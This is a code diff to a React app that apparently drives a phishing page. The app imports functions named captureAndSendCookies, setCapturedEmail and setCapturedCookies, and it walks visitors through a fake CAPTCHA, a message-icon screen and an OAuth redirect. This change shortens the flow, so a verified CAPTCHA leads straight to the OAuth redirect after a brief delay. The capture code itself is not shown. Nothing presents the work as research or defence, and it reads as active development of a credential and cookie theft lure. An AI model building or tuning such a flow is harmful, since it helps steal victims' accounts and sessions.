@@ -9,6 +9,7 @@ import { captureAndSendCookies, setCapturedEmail, setCapturedCookies } from './u
 // Artificial delay helper (milliseconds)
 const SLOW_DELAY = 1200; // Base delay, x3 for each step (e.g., 3600ms)
 const nextStepDelay = SLOW_DELAY * 3;
+const messageIconDelay = 500; // This matches the delay used in MessageIconLanding
 
 function App() {
   const [currentPage, setCurrentPage] = useState('captcha');
@@ -257,21 +258,15 @@ function App() {
       const timer = setTimeout(() => {
         setCurrentPage(pendingStep);
         setPendingStep(null);
-      }, nextStepDelay);
+      }, pendingStep === 'oauth-redirect' ? messageIconDelay : nextStepDelay);
       return () => clearTimeout(timer);
     }
   }, [pendingStep]);
 
-  // Step 1: Captcha verified: go to message icon with delay
+  // Step 1: Captcha verified: go to oauth redirect with same delay as MessageIconLanding
   const handleCaptchaVerified = () => {
-    console.log('✅ CAPTCHA verified - waiting (slow) before moving to message icon landing');
-    setPendingStep('message-icon');
-  };
-
-  // Step 2: Message icon opened: go to oauth redirect with delay
-  const handleMessageOpen = () => {
-    console.log('📧 Message icon clicked - waiting (slow) before moving to OAuth redirect');
-    setPendingStep('oauth-redirect');
+    console.log('✅ CAPTCHA verified - waiting for message icon delay before moving to OAuth redirect');
+    setPendingStep('oauth-redirect'); // go directly to 'oauth-redirect' step, with messageIconDelay
   };
 
   // Refresh page for back-to-captcha
@@ -309,7 +304,7 @@ function App() {
     case 'message-icon':
       return (
         <MessageIconLanding 
-          onOpenMessage={handleMessageOpen}
+          onOpenMessage={() => {}} // No longer used in flow
         />
       );
 
